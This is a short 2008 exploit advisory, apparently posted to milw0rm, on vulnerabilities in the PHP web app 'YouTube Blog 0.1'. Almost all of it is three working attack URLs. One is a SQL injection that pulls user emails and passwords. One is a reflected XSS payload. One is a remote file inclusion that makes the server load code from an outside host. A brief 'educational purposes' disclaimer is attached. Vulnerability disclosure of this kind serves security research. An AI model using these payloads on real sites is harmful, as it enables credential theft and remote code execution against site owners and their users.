@@ -1,0 +1,56 @@
+  _____ _   _ _____  _____ _____ _____  
+ /  ___| |_| |  _  \|  _  |  _  |_   _| 
+ | (___|  _  | [_)_/| (_) | (_) | | |   
+ \_____|_| |_|_| |_||_____|_____| |_|   
+        C. H. R. O. O. T.  SECURITY  GROUP
+        - -- ----- --- -- -- ---- --- -- - 
+                     http://www.chroot.org
+
+                          _   _ _ _____ ____ ____ __  _ 
+        Hacks In Taiwan  | |_| | |_   _|  __|    |  \| |
+        Conference 2008  |  _  | | | | | (__| () |     |
+                         |_| |_|_| |_| \____|____|_|\__|
+                                      http://www.hitcon.org
+
+
+Title =======:: YouTube Blog 0.1 Multiple Remote Vulnerabilities
+
+Author ======:: unohope [at] chroot [dot] org
+
+IRC =========:: irc.chroot.org #chroot
+
+ScriptName ==:: YouTube Blog
+
+Download ====:: http://nchc.dl.sourceforge.net/sourceforge/youtubeblog/ytb_v0.1.zip
+
+Mirror ======:: http://www.badongo.com/file/10507193
+
+______________________
+
+magic_quotes_gpc = Off
+safe_mode = Off
+
+_____
+[SQL]
+
+http://victim/ytb/todos.php?id=-99+union+select+1,2,mail,contrasena,5,6,7+from+ytb_usuarios+where+id=1/*
+
+_____
+[XSS]
+
+http://victim/ytb/mensaje.php?m=<script>alert(/xss/)</script>
+
+_____
+[RFI]
+
+http://victim/ytb/cuenta/cuerpo.php?base_archivo=http://192.168.1.111/blah.txt
+
+
+and more .. = =
+
+______
+[NOTE]
+
+!! This is just for educational purposes, DO NOT use for illegal. !!
+
+# milw0rm.com [2008-07-22]
